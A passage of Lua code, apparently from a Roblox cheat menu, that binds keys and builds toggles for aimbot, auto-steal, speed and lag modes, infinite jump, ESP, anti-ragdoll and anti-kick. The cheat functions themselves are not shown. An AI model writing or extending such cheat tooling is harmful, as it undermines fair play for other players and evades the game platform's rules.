                elseif (isGamepadInputType(uit) or tostring(kc):find("Button", 1, true)) and kc ~= Enum.KeyCode.Unknown then
                    clearKeyFromOthers(activeKBId, "gp", kc)
                    info.entry.gp = kc
                    if info.entry == M.KB.LaggerCarry or (type(activeKBId)=="string" and activeKBId:find("LaggerCarry", 1, true)) then
                        M.KB.LaggerCarry = info.entry
                    end
                    refreshKeybindButton(activeKBId)
                    activeKBId = nil
                    M._anyKeyListening = false
                    if listeningTimeout then pcall(function() task.cancel(listeningTimeout) end); listeningTimeout = nil end
                    pcall(saveCherryConfig)
                end
            end
            return
        end

        if gameProcessed then return end
        if input.UserInputType ~= Enum.UserInputType.Keyboard and not isGamepadInputType(input.UserInputType) then return end
        local kc = input.KeyCode
        if kc == Enum.KeyCode.Unknown then return end

        if kbMatch(M.KB.LaggerToggle, kc) then

            if (M.speedUIMode or "Original") == "Customizer" then
                M.toggleSpeedCustomizerPath()
            else
                local now = tick()
                if not M._lastLaggerBindPress or now - M._lastLaggerBindPress > 0.12 then
                    M._lastLaggerBindPress = now
                    M.cycleLaggerModeBind()
                end
            end
        elseif kbMatch(M.KB.LaggerCarry, kc) then
            local now = tick()
            if not M._lastLaggerCarryBindPress or now - M._lastLaggerCarryBindPress > 0.12 then
                M._lastLaggerCarryBindPress = now
                if M.toggleLaggerCarry then
                    M.toggleLaggerCarry()
                end
            end
        elseif kbMatch(M.KB.SpeedToggle, kc) then

            if (M.speedUIMode or "Original") == "Customizer" then
                M.setSpeedCustomizerPath("Normal")
            else
                M.toggleCarryMode()
                task.defer(function() pcall(saveCherryConfig) end)
            end
        elseif kbMatch(M.KB.DropBrainrot, kc) then

            if M.KB.DropBrainrot and (M.KB.DropBrainrot.kb or M.KB.DropBrainrot.gp) then
                M.runDrop()
            end
        elseif kbMatch(M.KB.TPFloor, kc) then
            M.runTPFloor()
        elseif kbMatch(M.KB.AutoLeft, kc) then
            M.autoLeftEnabled = not M.autoLeftEnabled
            if M.autoLeftEnabled then
                if M.autoRightEnabled then M.autoRightEnabled = false; M.stopAutoRight() end
                if M.autoBatEnabled then M.stopBatAimbot() end
                M.startAutoLeft()
            else
                M.stopAutoLeft()
            end
            if M.autoLeftSetVisual then M.autoLeftSetVisual(M.autoLeftEnabled) end
            if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(M.autoLeftEnabled) end
            saveCherryConfig()
        elseif kbMatch(M.KB.AutoRight, kc) then
            M.autoRightEnabled = not M.autoRightEnabled
            if M.autoRightEnabled then
                if M.autoLeftEnabled then M.autoLeftEnabled = false; M.stopAutoLeft() end
                if M.autoBatEnabled then M.stopBatAimbot() end
                M.startAutoRight()
            else
                M.stopAutoRight()
            end
            if M.autoRightSetVisual then M.autoRightSetVisual(M.autoRightEnabled) end
            if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(M.autoRightEnabled) end
            saveCherryConfig()
        elseif kbMatch(M.KB.AutoBat, kc) then
            if not M.autoBatEnabled then
                if M.autoLeftEnabled then M.autoLeftEnabled = false; M.stopAutoLeft() end
                if M.autoRightEnabled then M.autoRightEnabled = false; M.stopAutoRight() end
                M.queueAutoBatStart()
            else
                M.stopBatAimbot()
            end
            if M.autoBatSetVisual then M.autoBatSetVisual(M.autoBatEnabled) end
            if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(M.autoBatEnabled) end
            saveCherryConfig()
        elseif kbMatch(M.KB.BatTP, kc) then
            if M.toggleBatTPAimbot then M.toggleBatTPAimbot() end
        elseif kbMatch(M.KB.BypassAimbot, kc) then
            M.toggleBypassAimbot()
            if M.setBypassVisual then M.setBypassVisual(M.bypassAimbotEnabled) end
            if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(M.bypassAimbotEnabled) end
            saveCherryConfig()
        elseif kbMatch(M.KB.InstaReset, kc) then
            if M.cursedInstaReset then pcall(M.cursedInstaReset) end
        elseif kbMatch(M.KB.GuiHide, kc) then
            if Frame then
                Frame.Visible = not Frame.Visible
                MinPill.Visible = not Frame.Visible
                M.menuOpen = Frame.Visible == true
                pcall(saveCherryConfig)
            end
        end
    end)


    local originalWrap = Instance.new("Frame")
    originalWrap.Name = "OriginalWrap"
    originalWrap.BackgroundTransparency = 1
    originalWrap.Size = UDim2.new(1, 0, 0, 0)
    originalWrap.AutomaticSize = Enum.AutomaticSize.Y
    originalWrap.Parent = PM
    Instance.new("UIListLayout", originalWrap).Padding = UDim.new(0, 8)

    -- Speed configuration only (keybinds live in KEYBINDS tab)
    uiSectionHeader(originalWrap, "SPEED CONFIGURATION")
    local _, nsBox = uiStepNumberRow(originalWrap, "Normal Speed", M.NS, 1, 500, function(v) M.NS = v; saveCherryConfig() end)
    local _, csBox = uiStepNumberRow(originalWrap, "Carry Speed", M.CS, 1, 500, function(v) M.CS = v; saveCherryConfig() end)
    M.normalBox = nsBox; M.carryBox = csBox

    uiSectionHeader(originalWrap, "LAGGER CONFIGURATION")
    local _, lsBox = uiStepNumberRow(originalWrap, "Lagger Normal", M.LAGGER_SPEED, 1, 500, function(v)
        M.LAGGER_SPEED = math.max(1, tonumber(v) or M.LAGGER_SPEED or 30)
        saveCherryConfig()
    end)
    local _, lcBox = uiStepNumberRow(originalWrap, "Lagger Carry", M.LAGGER_CARRY_SPEED, 1, 500, function(v)
        M.LAGGER_CARRY_SPEED = math.max(1, tonumber(v) or M.LAGGER_CARRY_SPEED or 15)
        saveCherryConfig()
    end)
    M._laggerSpeedBox = lsBox
    M._laggerCarrySpeedBox = lcBox
    M.laggerBox = lsBox

    -- Shared background image (menu + mini + steal bar)
    do
        local opts = M.BG_IMAGE_OPTIONS or {
            {id = 74584689202918, name = "Original"},
            {id = 89605409882330, name = "BG 2"},
            {id = 131573205217238, name = "BG 3"},
            {id = 73023682914801, name = "Menu"},
        }
        M.bgImageIndex = math.clamp(tonumber(M.bgImageIndex) or tonumber(M.bypassBgIndex) or 1, 1, #opts)
        local _, _, curName = M.getSelectedBgId()
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=Color3.fromRGB(0, 0, 0); r.BackgroundTransparency=0; r.BorderSizePixel=0; r.Parent=originalWrap; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-120,1,0)
        l.BackgroundTransparency=1; l.Text="Background Image"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local btn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
            Text=curName, Col=UI_TEXT_PRIMARY, TS=11, CR=6, SC=UI_ACCENT, STr=0.3})
        btn.MouseButton1Click:Connect(function()
            M.bgImageIndex = (M.bgImageIndex % #opts) + 1
            M.bypassBgIndex = M.bgImageIndex
            local _, _, name = M.getSelectedBgId()
            btn.Text = name
            if M.applySharedBackground then pcall(M.applySharedBackground) end
            pcall(saveCherryConfig)
        end)
        M._bgImageBtn = btn
    end

    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=Color3.fromRGB(0, 0, 0); r.BackgroundTransparency=0; r.BorderSizePixel=0; r.Parent=originalWrap; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Carry Mode"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local carryBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
            Text=M.carrySpeedActive and "Carry On" or "Carry Off", Col=UI_TEXT_PRIMARY, TS=12, CR=6, SC=UI_ACCENT, STr=0.3})
        local function applyCarryBtnColor(on)
            carryBtn.Text = on and "Carry On" or "Carry Off"
            carryBtn.BackgroundTransparency = 0
            if on then
                carryBtn.BackgroundColor3 = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
                carryBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            else
                carryBtn.BackgroundColor3 = UI_BTN_BG or Color3.fromRGB(0, 0, 0)
                carryBtn.TextColor3 = UI_TEXT_PRIMARY or Color3.fromRGB(255, 255, 255)
            end
            local st = carryBtn:FindFirstChildOfClass("UIStroke")
            if st then
                st.Color = on and Color3.fromRGB(255, 255, 255) or (UI_ACCENT or Color3.fromRGB(40, 40, 40))
                st.Transparency = on and 0 or 0.3
            end
        end
        applyCarryBtnColor(M.carrySpeedActive == true)
        carryBtn.MouseButton1Click:Connect(function()
            M.carrySpeedActive = not M.carrySpeedActive
            if M.carrySpeedActive then M.laggerCarryActive = false; M.laggerModeEnabled = false end
            applyCarryBtnColor(M.carrySpeedActive == true)
            if M._applyLagBtnColor then M._applyLagBtnColor(M.laggerModeEnabled == true) end
            if M._applyLCBtnColor then M._applyLCBtnColor(M.laggerCarryActive == true) end
            if M.mobBtnRefs then
                if M.mobBtnRefs.carrySpeed then pcall(function() M.mobBtnRefs.carrySpeed(M.carrySpeedActive == true) end) end
                if M.mobBtnRefs.lagger then pcall(function() M.mobBtnRefs.lagger(M.laggerModeEnabled == true) end) end
                if M.mobBtnRefs.laggerCarry then pcall(function() M.mobBtnRefs.laggerCarry(M.laggerCarryActive == true) end) end
            end
            if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
            if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
            saveCherryConfig()
        end)
        M.carryModeBtn = carryBtn
        M._applyCarryBtnColor = applyCarryBtnColor
    end

    local _, setAutoCarry = uiToggleRow(PM, "Auto Switch Carry", M.autoSwitchSpeedEnabled, function(on)
        M.autoSwitchSpeedEnabled = on
        M._autoSwitchWasSteal = nil
        if not on then
            if M.carryModeBtn then
                M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
            end
            if M.mobBtnRefs and M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
        end
        M.refreshWalkSpeedAutoSwitch()
        saveCherryConfig()
    end)
    M.setAutoCarryVisual = setAutoCarry
    local _, setAutoCarryBase = uiToggleRow(PM, "Auto Carry on Enemy Base", M.autoCarryEnemyBaseEnabled, function(on)
        M.setAutoCarryEnemyBase(on); saveCherryConfig()
    end)
    M.setAutoCarryEnemyBaseVisual = setAutoCarryBase
    local _, acbRangeBox = uiNumberRow(PM, "Enemy Base Range", M.autoCarryEnemyBaseRange or 35, 5, 150, function(v)
        M.autoCarryEnemyBaseRange = v; saveCherryConfig()
    end)
    M.autoCarryEnemyBaseRangeBox = acbRangeBox

    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=Color3.fromRGB(0, 0, 0); r.BackgroundTransparency=0; r.BorderSizePixel=0; r.Parent=originalWrap; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Lagger Mode"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local modeBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
            Text=M.laggerModeEnabled and "Lag On" or "Lag Off", Col=UI_TEXT_PRIMARY, TS=12, CR=6, SC=UI_ACCENT, STr=0.3})
        local function applyLagBtnColor(on)
            modeBtn.Text = on and "Lag On" or "Lag Off"
            modeBtn.BackgroundTransparency = 0
            if on then
                modeBtn.BackgroundColor3 = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
                modeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            else
                modeBtn.BackgroundColor3 = UI_BTN_BG or Color3.fromRGB(0, 0, 0)
                modeBtn.TextColor3 = UI_TEXT_PRIMARY or Color3.fromRGB(255, 255, 255)
            end
            local st = modeBtn:FindFirstChildOfClass("UIStroke")
            if st then
                st.Color = on and Color3.fromRGB(255, 255, 255) or (UI_ACCENT or Color3.fromRGB(40, 40, 40))
                st.Transparency = on and 0 or 0.3
            end
        end
        applyLagBtnColor(M.laggerModeEnabled == true)
        modeBtn.MouseButton1Click:Connect(function()
            M.toggleLaggerMode()
            applyLagBtnColor(M.laggerModeEnabled == true)
        end)
        M.laggerModeBtn = modeBtn
        M._applyLagBtnColor = applyLagBtnColor
    end

    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=Color3.fromRGB(0, 0, 0); r.BackgroundTransparency=0; r.BorderSizePixel=0; r.Parent=originalWrap; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Lagger Carry Mode"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local modeBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
            Text=M.laggerCarryActive and "L.Carry On" or "L.Carry Off", Col=UI_TEXT_PRIMARY, TS=12, CR=6, SC=UI_ACCENT, STr=0.3})
        local function applyLCBtnColor(on)
            modeBtn.Text = on and "L.Carry On" or "L.Carry Off"
            modeBtn.BackgroundTransparency = 0
            if on then
                modeBtn.BackgroundColor3 = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
                modeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            else
                modeBtn.BackgroundColor3 = UI_BTN_BG or Color3.fromRGB(0, 0, 0)
                modeBtn.TextColor3 = UI_TEXT_PRIMARY or Color3.fromRGB(255, 255, 255)
            end
            local st = modeBtn:FindFirstChildOfClass("UIStroke")
            if st then
                st.Color = on and Color3.fromRGB(255, 255, 255) or (UI_ACCENT or Color3.fromRGB(40, 40, 40))
                st.Transparency = on and 0 or 0.3
            end
        end
        applyLCBtnColor(M.laggerCarryActive == true)
        modeBtn.MouseButton1Click:Connect(function()
            M.toggleLaggerCarry()
            applyLCBtnColor(M.laggerCarryActive == true)
            if M._applyLagBtnColor then M._applyLagBtnColor(M.laggerModeEnabled == true) end
            if M._applyCarryBtnColor then M._applyCarryBtnColor(M.carrySpeedActive == true) end
        end)
        M.laggerCarryBtn = modeBtn
        M._applyLCBtnColor = applyLCBtnColor
    end

    local function refreshSpeedUIBlocks()
        originalWrap.Visible = true
        if M.speedBoosterMain then M.speedBoosterMain.Visible = false end
        pcall(function() M.refreshOriginalModeMobileButtons() end)
    end
    M._refreshSpeedUIBlocks = refreshSpeedUIBlocks
    refreshSpeedUIBlocks()

    uiSectionHeader(PMech, "STUFF")
    local _, setHardHit = uiToggleRow(PMech, "Hard Hit", M.hardHitEnabled, function(on)
        if on then M.startHardHit() else M.stopHardHit() end
        saveCherryConfig()
    end)
    M.setHardHitVisual = setHardHit
    uiNumberRow(PMech, "Hard Hit Range", M.hardHitRadius or 10, 1, 100, function(v)
        M.hardHitRadius = v
        if M._hardHitRing then
            M._hardHitRing.Radius = v
            M._hardHitRing.InnerRadius = math.max(0.1, v - 0.35)
        end
        saveCherryConfig()
    end)
    local _batAimModeIdx = (tostring(M.batAimbotMode or "Normal") == "Bypass") and 2 or 1
    local _, setBatAimbot, setBatAimModeUI = uiExpandToggleRow(PMech, "Bat Aimbot", M.autoBatEnabled == true, {"Normal","Bypass"}, _batAimModeIdx, function(on)
        if on then
            M.autoBatEnabled = true
            if M.queueAutoBatStart then M.queueAutoBatStart() end
        else
            if M.stopBatAimbot then M.stopBatAimbot() end
            M.autoBatEnabled = false
        end
        if M.autoBatSetVisual then M.autoBatSetVisual(M.autoBatEnabled == true) end
        if M.mobBtnRefs and M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(M.autoBatEnabled == true) end
        saveCherryConfig()
    end, function(mode)
        local m = tostring(mode or "Normal")
        if m ~= "Normal" and m ~= "Bypass" then m = "Normal" end
        M.batAimbotMode = m
        pcall(saveCherryConfig)
        if M.autoBatEnabled then
            if M.stopBatAimbot then pcall(M.stopBatAimbot) end
            M.autoBatEnabled = true
            if M.queueAutoBatStart then pcall(M.queueAutoBatStart) end
        end
        pcall(saveCherryConfig)
    end)
    M.autoBatSetVisual = setBatAimbot
    M.setBatAimModeUI = setBatAimModeUI
    pcall(function()
        if setBatAimModeUI and M.batAimbotMode then setBatAimModeUI(M.batAimbotMode) end
    end)

    -- Mirror TP Down always ON (no toggle)
    M.mirrorTPDownEnabled = true
    M.setMirrorTPVisual = function() end

    local _, setBatCounter = uiToggleRow(PMech, "Bat Counter", M.batCounterEnabled, function(on)
        M.batCounterEnabled = on
        if on then M.startBatCounter() else M.stopBatCounter() end
        saveCherryConfig()
    end)
    M.setBatCounterVisual = setBatCounter

    local _batVerIdx = ({V1=1,V2=2,V3=3,V4=4})[tostring(M.batTPVersion or "V1")] or 1
    local _, setBatTPVis, setTpBatModeUI = uiExpandToggleRow(PMech, "Bat TP", M.batTPEnabled == true, {"V1","V2","V3","V4"}, _batVerIdx, function(on)
        if on then
            M.batTPEnabled = true
            M._batTPRunningVersion = nil -- always (re)apply the saved version
            if M.startBatTPAimbot then M.startBatTPAimbot() end
        else
            if M.stopBatTPAimbot then M.stopBatTPAimbot() end
            M.batTPEnabled = false
        end
        if M.setBatTPVisual then M.setBatTPVisual(M.batTPEnabled == true) end
        if M.mobBtnRefs and M.mobBtnRefs.batTP then M.mobBtnRefs.batTP(M.batTPEnabled == true) end
        pcall(saveCherryConfig)
    end, function(mode)
        local v = tostring(mode or "V1"):upper():gsub("%s+", "")
        if v == "1" or v == "2" or v == "3" or v == "4" then v = "V" .. v end
        if not ({V1=true,V2=true,V3=true,V4=true})[v] then v = "V1" end
        M.batTPVersion = v
        M._batTPRunningVersion = nil
        -- Always persist immediately so V4 survives rejoin
        pcall(saveCherryConfig)
        if M.batTPEnabled then
            if M.stopBatTPAimbot then pcall(M.stopBatTPAimbot) end
            M.batTPEnabled = true
            if M.startBatTPAimbot then pcall(M.startBatTPAimbot) end
        end
        pcall(saveCherryConfig)
        -- Re-sync UI label so it never visually snaps back to V3
        pcall(function()
            if M.setTpBatModeUI then M.setTpBatModeUI(M.batTPVersion) end
        end)
    end)
    M.setBatTPVisual = setBatTPVis
    M.setTpBatModeUI = setTpBatModeUI
    pcall(function()
        local ver = M._loadedBatTPVersion or M.batTPVersion or "V1"
        if type(ver) == "string" and ({V1=true,V2=true,V3=true,V4=true})[ver] then
            M.batTPVersion = ver
        end
        if setTpBatModeUI then setTpBatModeUI(M.batTPVersion) end
    end)

    local _, setAntiRag = uiToggleRow(PMech, "Anti Ragdoll", M.antiRagdollEnabled, function(on)
        M.antiRagdollEnabled = on
        if on then M.startAntiRagdoll() else M.stopAntiRagdoll() end
    end)
    M.setAntiRagVisual = setAntiRag

    local _, setAntiRagModeUI = uiChoiceRow(PMech, "Anti Ragdoll Mode", {"Splatter","No Splatter"},
        M.antiRagdollMode == "No Splatter" and 2 or 1,
        function(newMode)
            M.antiRagdollMode = (newMode == "No Splatter") and "No Splatter" or "Splatter"
            if M.antiRagdollEnabled then M.stopAntiRagdoll(); M.startAntiRagdoll() end
            saveCherryConfig()
        end
    )
    M.setAntiRagModeUI = setAntiRagModeUI

    local _, setMedusa = uiToggleRow(PMech, "Medusa Counter", M.medusaCounterEnabled, function(on)
        M.medusaCounterEnabled = on
        if on then
            M.setupMedusa(player.Character)
        else
            M.stopMedusaCounter()
        end
        saveCherryConfig()
    end)
    M.setMedusaVisual = setMedusa

    local _, setAutoSwing = uiToggleRow(PMech, "Auto Swing", M.autoSwingEnabled, function(on)
        M.autoSwingEnabled = on
    end)
    M.setAutoSwingVisual = setAutoSwing

    uiSectionHeader(PMech, "STEAL")

    M.stealMode = "V2"
    local stealModeLabels = {"V2"}
    local stealDefaultIdx = 1

    local _, setAutoSteal, setStealModeUI, regStealSettings = uiExpandToggleRow(
        PMech,
        "Auto Steal",
        M.Steal.AutoStealEnabled,
        stealModeLabels,
        stealDefaultIdx,
        function(on)
            M.Steal.AutoStealEnabled = on
            M.stealMode = "V2"
            if on then M.startAutoSteal() else M.stopAutoSteal() end
            saveCherryConfig()
        end,
        function(newLabel)
            M.stealMode = "V2"
            if M.updateStatusModeBadge then pcall(M.updateStatusModeBadge) end
            M.updateStatusRadius()
            saveCherryConfig()
        end
    )
    M.setInstaGrab = setAutoSteal
    M.setStealModeUI = setStealModeUI

    local v2Box = Instance.new("Frame"); v2Box.BackgroundTransparency=1; v2Box.Size=UDim2.new(1,0,0,0); v2Box.AutomaticSize=Enum.AutomaticSize.Y
    local v2Lay = Instance.new("UIListLayout"); v2Lay.Padding=UDim.new(0,6); v2Lay.Parent=v2Box
    local _, srBox = uiNumberRow(v2Box, "Grab Radius", M.Steal.StealRadius, 0.5, 300, function(v)
        M.Steal.StealRadius = v; M.setStealRadius(v); M.updateStatusRadius(); saveCherryConfig()
    end)
    M.radInput = srBox
    local _, sdBox = uiNumberRow(v2Box, "Hold Duration", M.Steal.StealDuration, 0.1, 10, function(v)
        M.Steal.StealDuration = v
        saveCherryConfig()
    end)
    M.durationBox = sdBox
    local _, setAutoRadius = uiToggleRow(v2Box, "Auto Radius", M.autoRadiusEnabled, function(on)
        M.autoRadiusEnabled = on; M.updateStatusRadius(); saveCherryConfig()
    end)
    M.setAutoRadiusVisual = setAutoRadius
    regStealSettings("V2", v2Box)

    local _, sbBox = uiNumberRow(PMech, "Steal Bar Size", M.stealBarSize or 220, 160, 480, function(v)
        local n = tonumber(v)
        if n and n >= 160 and n <= 480 then
            M.stealBarSize = math.floor(n)
            if M.buildStatusUI then M.buildStatusUI() end
            pcall(saveCherryConfig)
        end
    end)

    uiSectionHeader(PMech, "MOTION")
    local jumpDefaultIdx = (M.infJumpMode == "hold") and 2 or 1
    local _, setInfJump, setJumpModeUI = uiExpandToggleRow(
        PMech,
        "Infinite Jump",
        M.infJumpEnabled,
        {"Manual", "Hold"},
        jumpDefaultIdx,
        function(on)
            M.infJumpEnabled = on
            if on and M.infJumpMode == "manual" then M.startManualInfJumpLoop()
            elseif on and M.infJumpMode == "hold" then M.startHoldInfJump()
            else M.stopManualInfJumpLoop(); M.stopHoldInfJump() end
            saveCherryConfig()
        end,
        function(newMode)
            local wasOn = M.infJumpEnabled
            M.infJumpMode = (newMode == "Hold") and "hold" or "manual"
            if wasOn then
                M.stopManualInfJumpLoop(); M.stopHoldInfJump()
                if M.infJumpMode == "manual" then M.startManualInfJumpLoop()
                else M.startHoldInfJump() end
            end
            saveCherryConfig()
        end
    )
    M.setInfJumpVisual = setInfJump
    M.setJumpModeUI = setJumpModeUI

    local _, setAL = uiToggleRow(PMech, "Auto Left", M.autoLeftEnabled, function(on)
        if on then
            if M.autoRightEnabled then M.autoRightEnabled=false; M.stopAutoRight(); if M.autoRightSetVisual then M.autoRightSetVisual(false) end end
            if M.autoBatEnabled then M.stopBatAimbot(); if M.autoBatSetVisual then M.autoBatSetVisual(false) end end
            M.autoLeftEnabled=true; M.startAutoLeft()
        else M.autoLeftEnabled=false; M.stopAutoLeft() end
        if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(on) end
        saveCherryConfig()
    end)
    M.autoLeftSetVisual = setAL

    local _, setAR = uiToggleRow(PMech, "Auto Right", M.autoRightEnabled, function(on)
        if on then
            if M.autoLeftEnabled then M.autoLeftEnabled=false; M.stopAutoLeft(); if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end end
            if M.autoBatEnabled then M.stopBatAimbot(); if M.autoBatSetVisual then M.autoBatSetVisual(false) end end
            M.autoRightEnabled=true; M.startAutoRight()
        else M.autoRightEnabled=false; M.stopAutoRight() end
        if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(on) end
        saveCherryConfig()
    end)
    M.autoRightSetVisual = setAR

    local _, setATP = uiToggleRow(PMech, "Auto TP Down", M.autoTPEnabled, function(on)
        M.autoTPEnabled = on
        if on then M.startAutoTP() else M.stopAutoTP() end
        saveCherryConfig()
    end)
    M.setAutoTPVisual = setATP

    local _, setPerfectHit = uiToggleRow(PMech, "Perfect Hit", M.perfectHitEnabled ~= false, function(on)
        if M.setPerfectHit then M.setPerfectHit(on) else
            M.perfectHitEnabled = on
            M.tpBatSureHitEnabled = on
            M.tpBatHitMode = on and "Sure" or "Normal"
        end
        saveCherryConfig()
    end)
    M.setPerfectHitVisual = setPerfectHit

    local _, tpHBox = uiNumberRow(PMech, "TP Height", M.autoTPHeight, 1, 100, function(v) M.autoTPHeight = v; saveCherryConfig() end)
    M.autoTPHeightBox = tpHBox


    uiSectionHeader(PVis, "VISION")
    -- FPS Boost disabled per request; Anti Lag re-added as a toggle
    M.fpsBoostEnabled = false
    pcall(function() if M.disableFpsBoost then M.disableFpsBoost() end end)

    local _, setAntiLag = uiToggleRow(PVis, "Anti Lag", M.antiLagEnabled == true, function(on)
        if on then
            if M.enableAntiLag then M.enableAntiLag() end
        else
            if M.disableAntiLag then M.disableAntiLag() end
        end
        if M.setAntiLagVisual then pcall(function() M.setAntiLagVisual(M.antiLagEnabled == true) end) end
        pcall(saveCherryConfig)
    end)
    M.setAntiLagVisual = setAntiLag

    local _, setNoPlayerCol = uiToggleRow(PVis, "No Player Collision", M.noPlayerCollisionEnabled == true, function(on)
        if M.setNoPlayerCollision then M.setNoPlayerCollision(on) end
    end)
    M.setNoPlayerCollisionVisual = setNoPlayerCol


    local _, setBodyLock = uiToggleRow(PVis, "Body Lock", M.bodyLockEnabled == true, function(on)
        if M.setBodyLock then M.setBodyLock(on) end
        pcall(saveCherryConfig)
    end)
    M.setBodyLockVisual = setBodyLock

    local _, bodyLockRad = uiNumberRow(PVis, "Body Lock Radius", tonumber(M.bodyLockRadius) or 60, 10, 200, function(v)
        M.bodyLockRadius = v
        pcall(saveCherryConfig)
    end)

    local _, setStretch = uiToggleRow(PVis, "Stretch", M.stretchEnabled == true, function(on)
        if M.setStretch then
            M.setStretch(on)
        else
            if on then M.enableStretchRez() else M.disableStretchRez() end
        end
        pcall(saveCherryConfig)
    end)
    M.setStretchVisual = setStretch

    do
        local labels = {}
        for _, v in ipairs(M.fovOptions) do table.insert(labels, tostring(v)) end
        local fovIdx = 1
        for i, v in ipairs(M.fovOptions) do
            if v == M.fovValue then fovIdx = i break end
        end
        local _, setFovUI = uiChoiceRow(PVis, "FOV", labels, fovIdx, function(v)
            local n = tonumber(v) or 90
            M.fovValue = n
            for i, x in ipairs(M.fovOptions) do if x == n then M.fovIndex = i break end end
            M.applyFOV()
            saveCherryConfig()
        end)
        M.setFovVisual = setFovUI
    end

    uiSectionHeader(PVis, "ESP")
    local _, setPlayerESP = uiToggleRow(PVis, "Esp Player", M.playerESPEnabled == true, function(on)
        if M.toggleESP then M.toggleESP(on) end
        saveCherryConfig()
    end)
    M.setPlayerESPVisual = setPlayerESP
    M.setEnemyAvatarVisual = setPlayerESP

    M.lineESPEnabled = false
    M.speedESPEnabled = false
    M.highlightESPEnabled = false
    cherryESPState.LineESP = false
    cherryESPState.SpeedESP = false
    cherryESPState.HighlightESP = false

    uiSectionHeader(PUtil, "MISC")

    local _, setRemoveAcc = uiToggleRow(PUtil, "Remove Accessories", M.removeAccEnabled, function(on)
        M.removeAccEnabled = on
        if on then M.startRemoveAcc() else M.stopRemoveAcc() end
    end)

    M.antiKickEnabled = false
    pcall(function() if M.disableAntiKick then M.disableAntiKick() end end)

    local _, setSafeMode = uiToggleRow(PUtil, "Safe Mode", M.safeModeEnabled, function(on)
        M.safeModeEnabled = on
        if on then M.enableSafeMode() else M.disableSafeMode() end
        saveCherryConfig()
    end)
    M.setSafeModeVisual = setSafeMode


    local _, setIntroGUI = uiToggleRow(PUtil, "Intro GUI", false, function(on)
        M.introGUIEnabled = false -- intro permanently removed
        saveCherryConfig()
    end)

    local _, menuScaleBox = uiNumberRow(PUtil, "Menu Scale", tonumber(M.uiScale) or 0.6, 0.5, 1.2, function(v)
        M.uiScale = math.clamp(v, 0.5, 1.2)
        if M.uiScaleRef then M.uiScaleRef.Scale = M.uiScale end
        saveCherryConfig()
    end)

    -- ===== BUTTONS TAB =====
    uiSectionHeader(PBtn, "MOBILE CONTROLS")
    local _, setMobBtns = uiToggleRow(PBtn, "Mobile Buttons", M.mobileButtonsEnabled, function(on)
        M.mobileButtonsEnabled = on
        if on then M.buildMobileButtons() else M.destroyMobileButtons() end
        saveCherryConfig()
    end)

    local _, setCircleBtns = uiToggleRow(PBtn, "Circle Buttons", M.circleButtonsEnabled, function(on)
        M.circleButtonsEnabled = on
        pcall(function() if M.saveBtnPositions then M.saveBtnPositions() end end)
        if M.mobileButtonsEnabled then M.buildMobileButtons() end
        saveCherryConfig()
    end)
    M.setCircleBtnsVisual = setCircleBtns

    local _, setLockMob = uiToggleRow(PBtn, "Lock Buttons", M.mobileButtonsLocked == true, function(on)
        M.mobileButtonsLocked = on and true or false
        saveCherryConfig()
    end)
    M.setLockMobVisual = setLockMob

    local _, btnSzBox = uiNumberRow(PBtn, "Buttons Size", M.mobileButtonsSize, 40, 150, function(v)
        M.mobileButtonsSize = v
